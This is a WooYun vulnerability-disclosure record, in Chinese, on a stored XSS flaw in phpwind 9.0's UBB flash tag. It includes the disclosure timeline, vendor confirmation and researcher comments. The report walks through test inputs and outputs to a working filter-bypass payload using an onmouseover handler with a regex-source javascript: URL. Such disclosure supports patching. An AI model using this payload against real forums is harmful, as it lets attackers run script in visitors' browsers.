{"id": 1632, "wybug_id": "wooyun-2014-063613", "wybug_title": "phpwind9.0最新版 富文本存储型XSS漏洞", "wybug_corp": "phpwind", "wybug_author": "mramydnei", "wybug_date": "2014-06-05 08:24", "wybug_open_date": "2014-09-03 08:26", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-12：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-03：\t细节向公众公开  简要描述： 没有阅读你们的代码，没有华丽的代码分析。只是黑盒测试…… 详细说明：  代码编写不当导致phpwind发帖和回复功能均可以由攻击者植入恶意的js代码进而进行跨站脚本攻击。下面附上测试步骤，已便乌云重现和官方修复：注册账号，在任意板块进行发帖（切换到代码模式方便测试）测试输入1:\n[flash=480,400,0]http://businessinfo.co.uk/labs/xss/xss.swf[/flash]\n测试输出1:\n<object type=\"application/x-shockwave-flash\" data=\"http://businessinfo.co.uk/labs/xss/xss.swf\" id=\"jp_audio_container_0\" style=\"\" height=\"400\" width=\"480\">\t\t\t\t\t\t<param name=\"movie\" value=\"http://businessinfo.co.uk/labs/xss/xss.swf\">\t\t\t\t\t\t<param name=\"allowFullScreen\" value=\"true\">\t\t\t\t\t\t<param name=\"autostart\" value=\"true\">\t\t\t\t\t\t<param name=\"loop\" value=\"true\">\t\t\t\t\t\t<param name=\"allownetworking\" value=\"internal\">\t\t\t\t\t\t<param name=\"allowscriptaccess\" value=\"never\">\t\t\t\t\t\t<param name=\"quality\" value=\"high\">\t\t\t\t\t\t<param name=\"wmode\" value=\"transparent\">\t\t\t\t\t\t<div style=\"height:100%\">您还没有安装flash播放器,请点击<a href=\"http://www.adobe.com/go/getflash\" target=\"_blank\">这里</a>安装</div>\t\t\t\t    </object>\n确定输出点后，尝试在flash的url中加入双引号跳出value=\"\"和data=\"\"。测试输入2: \n[flash=480,400,0]http://businessinfo.co.uk/labs/xss/xss.swf\"asd qwe[/flash]\n测试输出2: \n[flash=480,400,0]http://businessinfo.co.uk/labs/xss/xss.swf\"asd qwe[/flash]\n发现URL中出现双引号时UBB CODE不会被转换成HTML CODE.但经过小的fuzzing后，发现当\n[flash=480,400,0]http://businessinfo.co.uk/labs/xss/xss.swf[/flash]\n之前出现UBB代码\n[attachment=8]\n时(点上传附件按钮，上传任何一种允许的文件类型。上传成功成功后点击插入即可)，情况就会有所转变。在这种情况下我们在[flash][/flash]中插入的双引号可以帮助我们跳出value=\"\"和data=\"\"。当然还有一些其它蛋疼的限制……测试输入3:\n[attachment=213][flash=1920,1080,0]http://businessinfo.co.uk/labs/xss/xss.swf\" onmouseover=alert() qq[/flash]\n测试输出3:\n[attachment=213][flash=1920,1080,0]http://businessinfo.co.uk/labs/xss/xss.swf\" onmouseover=alert() qq[/flash]\n当恶意脚本包含\"()\"时UBBCODE又一次没有被转换成HTML代码。蛋蛋的忧伤……经过一系列fuzz之后，发现：\n1.一旦出现(或)UBB CODE就不会被转换成HTML CODE2.所有的单引号，双引号，尖括号后面都会被加上%3b3.&会被替换成HTMLEntity也就是&amp;\n这样一来开新标签是不可能了，使用编码也是不可能了，所以机智的我……还是搞定了。最终测试输入:[attachment=999][flash=1920,1080,0]http://businessinfo.co.uk/labs/xss/xss.swf\" onmouseover=location=/javascript:alert%28%29/.source qq[/flash]最终测试输出：\n<object type=\"application/x-shockwave-flash\" data=\"http://businessinfo.co.uk/labs/xss/xss.swf\" %3b=\"\" onmouseover=\"location=/javascript:alert%28%29/.source\" qq\"=\"\" id=\"jp_audio_container_0\" style=\"\" height=\"1080\" width=\"1920\">\t\t\t\t\t\t<param name=\"movie\" value=\"http://businessinfo.co.uk/labs/xss/xss.swf\" %3b=\"\" onmouseover=\"location=/javascript:alert%28%29/.source\" qq\"=\"\">\t\t\t\t\t\t<param name=\"allowFullScreen\" value=\"true\">\t\t\t\t\t\t<param name=\"autostart\" value=\"true\">\t\t\t\t\t\t<param name=\"loop\" value=\"true\">\t\t\t\t\t\t<param name=\"allownetworking\" value=\"internal\">\t\t\t\t\t\t<param name=\"allowscriptaccess\" value=\"never\">\t\t\t\t\t\t<param name=\"quality\" value=\"high\">\t\t\t\t\t\t<param name=\"wmode\" value=\"transparent\">\t\t\t\t\t\t<div style=\"height:100%\">您还没有安装flash播放器,请点击<a href=\"http://www.adobe.com/go/getflash\" target=\"_blank\">这里</a>安装</div>\t\t\t\t    </object>\n就这样搞定了……因为flash的高宽值都可控，所以基本上小移动一下鼠标就中招了。   漏洞证明：  攻击者植入恶意代码，并发帖（也可以是回复 一样的嘛）：\n\n受害者打开被植入恶意代码的帖子时会遭受跨站脚本攻击：\n\n   修复方案：  没看代码也不好说怎么修复，你们是专业的 抽时间修复一下吧   版权声明：转载请注明来源 mramydnei@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-06-09 10:16 厂商回复： 非常感谢你对我们的支持与关注，该漏洞我们会尽快修复~ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-09 10:48 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  信M哥，得XSS    \n     2014-06-09 10:52 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  没有阅读你们的代码，没有华丽的代码分析.    \n     2014-06-09 12:39 |    \t\tYouYaX(乌云厂商)\t\t \n  牛叉！！！    \n     2014-06-09 12:39 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @YouYaX 好活跃的厂商啊~~    \n     2014-06-09 12:40 |    \t\tYouYaX(乌云厂商)\t\t \n  @寂寞的瘦子 我是一个程序员    \n     2014-08-12 07:44 |    \t\t小飞 \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:12        | 挖洞对于16岁的我来说实在是太艰难了！10...)\t\t \n  m锅威武，求看看帝国cms～    \n     2014-08-12 11:44 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  @小飞 今天早上起来看了一下，还是有xss的嘛（个人资料里的个人网站，投稿啥的）。还有后台的一些高危的操作，像添加管理员，执行sql 那些貌似也没个csrf token。    \n     2014-08-12 13:19 |    \t\t小飞 \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:12        | 挖洞对于16岁的我来说实在是太艰难了！10...)\t\t \n  @mramydnei 叼了。。。 m锅看到能打到后台的没啊，我的大学好多都用这个cms    \n     2014-08-12 14:53 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  @小飞 有开启投稿功能的话，可以    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}